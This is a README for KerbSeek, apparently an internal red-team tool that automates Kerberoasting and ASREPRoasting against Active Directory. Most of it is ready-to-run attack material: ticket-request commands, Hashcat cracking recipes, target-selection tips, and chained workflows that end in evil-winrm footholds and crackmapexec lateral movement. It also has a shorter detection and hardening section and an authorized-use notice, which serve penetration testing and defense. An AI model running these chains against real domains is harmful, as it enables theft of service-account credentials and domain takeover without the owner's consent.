# KerbSeek v1.0

## 🎫 Automated Kerberos Attack Tool

KerbSeek automates Kerberoasting and ASREPRoasting attacks against Active Directory. It requests TGS and AS-REP tickets, extracts Kerberos hashes in Hashcat-ready format, and identifies vulnerable accounts for offline password cracking.

---

## 🎯 Key Features

### Kerberoasting
- **TGS Ticket Requests** - Request service tickets for accounts with SPNs
- **Hashcat Integration** - Output in Hashcat mode 13100 format
- **Bulk Processing** - Attack multiple SPNs from file
- **Auto-Discovery** - Integrate with LDAPSeek for automatic target identification

### ASREPRoasting
- **AS-REP Requests** - Request authentication tickets without pre-authentication
- **No Credentials Required** - Attack works without valid domain credentials!
- **Hashcat Integration** - Output in Hashcat mode 18200 format
- **Bulk Processing** - Attack multiple users from file

### Automation
- **Auto Mode** - Combine LDAP enumeration with Kerberos attacks
- **Credential Testing** - Validate extracted credentials
- **Ticket Analysis** - Encryption type detection (RC4, AES128, AES256)

---

## 📦 Installation

### Prerequisites
```bash
# Install Impacket
pip3 install impacket

# Or from GitHub
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip3 install .
```

### Verify Installation
```bash
# Check for GetUserSPNs.py
which GetUserSPNs.py

# Check for GetNPUsers.py
which GetNPUsers.py
```

### Setup
```bash
cd Internal/kerbseek/
chmod +x kerbseek.py
```

---

## 🚀 Usage

### Kerberoasting

```bash
# Attack single SPN
./kerbseek.py --kerberoast --spn svc_sql -d CORP.LOCAL --dc dc01.corp.local -u user -p pass

# Attack multiple SPNs from file
./kerbseek.py --kerberoast --spns spns.txt -d CORP.LOCAL --dc dc01.corp.local -u user -p pass

# Attack all SPNs (auto-discovery)
./kerbseek.py --kerberoast-all -d CORP.LOCAL --dc dc01.corp.local -u user -p pass
```

### ASREPRoasting

```bash
# Attack single user (NO CREDENTIALS NEEDED!)
./kerbseek.py --asreproast --user testuser -d CORP.LOCAL --dc dc01.corp.local

# Attack multiple users from file
./kerbseek.py --asreproast --users asrep_users.txt -d CORP.LOCAL --dc dc01.corp.local

# Attack all vulnerable users (auto-discovery)
./kerbseek.py --asreproast-all -d CORP.LOCAL --dc dc01.corp.local
```

### Auto-Discovery Mode

```bash
# Combine LDAP enum + Kerberoasting
./kerbseek.py --auto dclist.txt -d CORP.LOCAL -u user -p pass

# Full attack (Kerberoast + ASREPRoast)
./kerbseek.py --auto dclist.txt -d CORP.LOCAL -u user -p pass --full
```

### Advanced Options

```bash
# Specify output format
./kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01 -u user -p pass --format hashcat

# Request specific encryption type
./kerbseek.py --kerberoast --spn svc_sql -d CORP --dc dc01 -u user -p pass --enctype 23

# Increase threading
./kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01 -u user -p pass --threads 10

# JSON output
./kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01 -u user -p pass --json
```

---

## 📊 Output Files

### kerblist.txt
Successful Kerberos attacks:
```
192.168.1.10:88
dc01.corp.local:88
```

### tgs_hashes.txt (Kerberoast)
Hashcat-ready TGS hashes (mode 13100):
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sqlserver.corp.local:1433*$a1b2c3d4...
$krb5tgs$23$*svc_iis$CORP.LOCAL$HTTP/webserver.corp.local*$e5f6g7h8...
```

### asrep_hashes.txt (ASREPRoast)
Hashcat-ready AS-REP hashes (mode 18200):
```
$krb5asrep$23$testuser@CORP.LOCAL:1a2b3c4d...
$krb5asrep$23$vendor@CORP.LOCAL:5e6f7g8h...
```

### kerb_details.txt
Human-readable report with:
- Attack statistics
- Successful ticket requests
- Encryption types used
- Cracking recommendations

### kerb_details.json
Machine-readable output:
```json
{
  "domain": "CORP.LOCAL",
  "dc": "dc01.corp.local",
  "kerberoast_results": {
    "total_spns": 15,
    "successful": 12,
    "failed": 3,
    "hashes": [
      {
        "username": "svc_sql",
        "spn": "MSSQLSvc/sqlserver.corp.local:1433",
        "hash": "$krb5tgs$23$*...",
        "encryption_type": "RC4-HMAC",
        "hashcat_mode": 13100
      }
    ]
  },
  "asreproast_results": {
    "total_users": 3,
    "successful": 2,
    "failed": 1,
    "hashes": [
      {
        "username": "testuser",
        "hash": "$krb5asrep$23$...",
        "encryption_type": "RC4-HMAC",
        "hashcat_mode": 18200
      }
    ]
  }
}
```

---

## 🔍 Understanding Kerberos Attacks

### Kerberoasting Explained

**How It Works:**
1. Attacker authenticates to AD (requires valid credentials)
2. Requests TGS service ticket for SPN (normal Kerberos behavior)
3. TGS is encrypted with service account's password hash
4. Extract TGS from ticket, save in Hashcat format
5. Crack offline with Hashcat/John

**Why It Works:**
- Service accounts often have weak, never-expiring passwords
- TGS request is normal behavior (not detected as attack)
- Cracking happens offline (no failed login attempts)

**Prerequisites:**
- Valid domain credentials (any user)
- Target account must have SPN
- Target account must be enabled

### ASREPRoasting Explained

**How It Works:**
1. Attacker sends AS-REQ for target user (NO credentials needed!)
2. If user has "Do not require Kerberos preauthentication" enabled:
3. DC responds with AS-REP encrypted with user's password hash
4. Extract AS-REP, save in Hashcat format
5. Crack offline with Hashcat/John

**Why It Works:**
- DONT_REQ_PREAUTH disables a critical security feature
- No valid credentials needed to request AS-REP
- Often forgotten on old/test accounts

**Prerequisites:**
- None! (unauthenticated attack)
- Target account must have DONT_REQ_PREAUTH flag
- Target account must be enabled

---

## 💡 Common Workflows

### Workflow 1: Complete Kerberoasting Chain
```bash
# 1. Find Domain Controllers
../dcseek/dcseek.py iplist.txt

# 2. Enumerate SPNs with LDAPSeek
../ldapseek/ldapseek.py dclist.txt --spns -u user -p pass

# 3. Kerberoast all SPNs
./kerbseek.py --kerberoast --spns ../ldapseek/spns.txt -d CORP --dc dc01 -u user -p pass

# 4. Crack with Hashcat
hashcat -m 13100 tgs_hashes.txt rockyou.txt --force

# 5. Use cracked credentials
evil-winrm -i target -u cracked_user -p cracked_pass
```

### Workflow 2: Unauthenticated ASREPRoasting
```bash
# 1. Find Domain Controllers (no creds needed)
../dcseek/dcseek.py iplist.txt

# 2. Find ASREPRoastable users (no creds needed!)
../ldapseek/ldapseek.py dclist.txt --asrep

# 3. ASREPRoast all users (no creds needed!)
./kerbseek.py --asreproast --users ../ldapseek/asrep_users.txt -d CORP --dc dc01

# 4. Crack with Hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force

# 5. First domain foothold!
evil-winrm -i dc01 -u cracked_user -p cracked_pass
```

### Workflow 3: Full Auto Attack
```bash
# 1. Find DCs
../dcseek/dcseek.py iplist.txt

# 2. Auto enumerate + attack
./kerbseek.py --auto dclist.txt -d CORP -u user -p pass --full

# 3. Crack all hashes
hashcat -m 13100 tgs_hashes.txt rockyou.txt --force
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force

# 4. Lateral movement
crackmapexec smb iplist.txt -u cracked_users.txt -p cracked_passes.txt
```

### Workflow 4: Targeted Attack
```bash
# Attack specific high-value service account
./kerbseek.py --kerberoast --spn svc_sqladmin -d CORP --dc dc01 -u user -p pass

# Crack with custom wordlist
hashcat -m 13100 tgs_hashes.txt --rules-file best64.rule wordlist.txt

# Check if service account is admin
../ldapseek/ldapseek.py dclist.txt --admins -u svc_sqladmin -p cracked_pass
```

---

## 🎯 Integration with Other Tools

### Chain 1: LDAP → Kerberos → WinRM
```bash
# Full attack chain
../ldapseek/ldapseek.py dclist.txt --full -u user -p pass
./kerbseek.py --kerberoast --spns ../ldapseek/spns.txt -d CORP --dc dc01 -u user -p pass
hashcat -m 13100 tgs_hashes.txt rockyou.txt
../winrmseek/winrmseek.py iplist.txt -t -u cracked_user -p cracked_pass
evil-winrm -i target -u cracked_user -p cracked_pass
```

### Chain 2: ASREPRoast → Privilege Escalation
```bash
# Unauthenticated start
./kerbseek.py --asreproast-all -d CORP --dc dc01
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Use first credential
../ldapseek/ldapseek.py dclist.txt --full -u cracked_user -p cracked_pass

# Kerberoast with new access
./kerbseek.py --kerberoast-all -d CORP --dc dc01 -u cracked_user -p cracked_pass
```

### Chain 3: CredSeek → Kerberos
```bash
# Find credentials
../credseek/credseek.py iplist.txt --deep

# Use found credentials for Kerberoasting
./kerbseek.py --kerberoast-all -d CORP --dc dc01 -u found_user -p found_pass
```

---

## 🔐 Encryption Types

### Supported Encryption Types

| Type | EncType | Hashcat Mode | Crackability |
|------|---------|--------------|--------------|
| RC4-HMAC | 23 | 13100 (TGS), 18200 (AS-REP) | ⚡ Fastest |
| AES128 | 17 | 19600 (TGS), 19700 (AS-REP) | 🐌 Slower |
| AES256 | 18 | 19700 (TGS), 19800 (AS-REP) | 🐌 Slowest |

### Why RC4-HMAC Matters

**RC4-HMAC (Type 23):**
- Weakest encryption (legacy support for Windows 2000/XP)
- NTLM hash used directly as encryption key
- Much faster to crack than AES
- Preferred target for Kerberoasting

**Downgrade Attacks:**
- Request RC4 even if AES is supported
- Use `--enctype 23` flag
- Works if RC4 not explicitly disabled

**AES Encryption:**
- Stronger encryption (AES128 or AES256)
- Slower to crack (10-100x slower than RC4)
- Default in modern Active Directory
- Can still be cracked with powerful hardware

---

## 🛡️ Detection & Defense

### Detection
- **Kerberos Logging** - Event ID 4769 (TGS requested)
- **Unusual SPN Requests** - Multiple TGS requests from single user
- **AS-REP Requests** - Event ID 4768 with unusual preauth type
- **Multiple Failed Decryptions** - Offline cracking attempts

### Event IDs
```
4768 - Kerberos TGT request (AS-REQ/AS-REP)
4769 - Kerberos service ticket request (TGS-REQ/TGS-REP)
4770 - Kerberos service ticket renewed
```

### Detection Rules
```
# Excessive TGS requests (Kerberoasting)
event_id=4769 AND count > 10 IN 60s FROM single_user

# AS-REP for users without preauth (ASREPRoasting)
event_id=4768 AND preauth_type=0 AND result=success

# RC4 downgrade (SPN requests with RC4 when AES available)
event_id=4769 AND encryption_type=0x17 (RC4)
```

### Defense

**High Priority:**
1. **Remove DONT_REQ_PREAUTH** - Eliminates ASREPRoasting
2. **Strong Service Account Passwords** - 25+ character random passwords
3. **Disable RC4-HMAC** - Force AES encryption
4. **Use gMSA** - Managed Service Accounts with 120-char passwords

**Medium Priority:**
5. **Monitor Kerberos Logs** - Alert on unusual TGS/AS-REP patterns
6. **Limit Service Account SPNs** - Reduce attack surface
7. **Rotate Service Passwords** - Regular password changes
8. **Enable Audit Logging** - Comprehensive Kerberos auditing

**Disable RC4-HMAC:**
```powershell
# Group Policy: Computer Configuration > Policies > Windows Settings > 
# Security Settings > Local Policies > Security Options
# Network security: Configure encryption types allowed for Kerberos
# Uncheck: RC4_HMAC_MD5
```

---

## 📝 Tips & Best Practices

### Maximizing Success
1. **Use Valid Credentials** - Low-priv domain user sufficient for Kerberoasting
2. **Target Service Accounts** - Look for svc_, service_, sql_, etc.
3. **Check Encryption Type** - RC4 much easier to crack than AES
4. **Custom Wordlists** - Company name, year, seasons (Summer2024!)
5. **Rules-Based Cracking** - Use Hashcat rules for variations

### Common Pitfalls
❌ **Not checking account status** - Disabled accounts won't work  
❌ **Wrong domain name** - Use FQDN (CORP.LOCAL not CORP)  
❌ **Missing Impacket** - Install GetUserSPNs.py and GetNPUsers.py  
❌ **Weak wordlists** - Service accounts often have strong passwords  
❌ **Giving up too early** - Try multiple wordlists and rules  

### Cracking Tips
```bash
# Quick test with common passwords
hashcat -m 13100 tgs_hashes.txt top1000.txt

# Full rockyou with rules
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule

# Company-specific wordlist
cewl https://company.com -d 2 -m 8 -w company.txt
hashcat -m 13100 tgs_hashes.txt company.txt -r best64.rule

# Brute force (8-10 chars)
hashcat -m 13100 tgs_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s
```

---

## 🚨 Common Findings

### Critical Findings
✅ **ASREPRoastable Accounts**
- No credentials needed to attack
- Often forgotten test/vendor accounts
- First foothold in unauthenticated scenario

✅ **Service Accounts with Weak Passwords**
- Common patterns: ServiceAccountName123!
- Season + Year: Summer2024!
- Company name variants

✅ **Service Accounts in Admin Groups**
- Compromise = Domain Admin
- Check with LDAPSeek after cracking

### High-Value Targets
✅ **SQL Service Accounts** - Often have sysadmin rights
✅ **IIS Service Accounts** - Web server access
✅ **SharePoint Service Accounts** - Farm admin rights
✅ **Backup Service Accounts** - Can access all systems

---

## 🔧 Troubleshooting

### Impacket Not Found
```bash
# Install Impacket
pip3 install impacket

# Or install from GitHub
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip3 install .

# Verify
which GetUserSPNs.py
which GetNPUsers.py
```

### Clock Skew Errors
```bash
# Kerberos requires time sync (5 min tolerance)
# Sync time with DC
sudo ntpdate dc01.corp.local

# Or use system time sync
sudo timedatectl set-ntp true
```

### No Hashes Returned
```bash
# For Kerberoasting: Check credentials
./kerbseek.py --kerberoast --spn svc_sql -d CORP --dc dc01 -u user -p pass

# For ASREPRoasting: Check DONT_REQ_PREAUTH flag
../ldapseek/ldapseek.py dclist.txt --asrep

# Check if accounts are enabled
../ldapseek/ldapseek.py dclist.txt --full -u user -p pass | grep ACCOUNTDISABLE
```

### Slow Performance
```bash
# Increase threads
./kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01 -u user -p pass --threads 10

# Attack single SPN first to test
./kerbseek.py --kerberoast --spn svc_sql -d CORP --dc dc01 -u user -p pass
```

---

## 📚 References

- [Kerberoasting Whitepaper](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- [ASREPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Impacket GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
- [Hashcat Kerberos Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [MITRE ATT&CK T1558](https://attack.mitre.org/techniques/T1558/)

---

## 🎓 Related Tools

### In This Suite
- **LDAPSeek** - Find Kerberoasting/ASREPRoasting targets
- **DCSeek** - Discover Domain Controllers
- **WinRMSeek** - Test cracked credentials
- **CredSeek** - Find credentials for initial access

### External Tools
- **Rubeus** - Windows-based Kerberos attacks
- **Invoke-Kerberoast** - PowerShell Kerberoasting
- **kerbrute** - Kerberos user enumeration
- **Hashcat** - Password cracking (modes 13100, 18200, 19600-19800)
- **John the Ripper** - Alternative password cracker

---

## ⚖️ Legal Notice

**FOR AUTHORIZED PENETRATION TESTING ONLY**

KerbSeek is designed for legitimate security assessments with proper authorization. Unauthorized Kerberos attacks are illegal. Always ensure you have written permission before testing.

---

**Version:** 1.0  
**Author:** Internal Red Team  
**License:** Internal Use Only  
**Last Updated:** October 2025
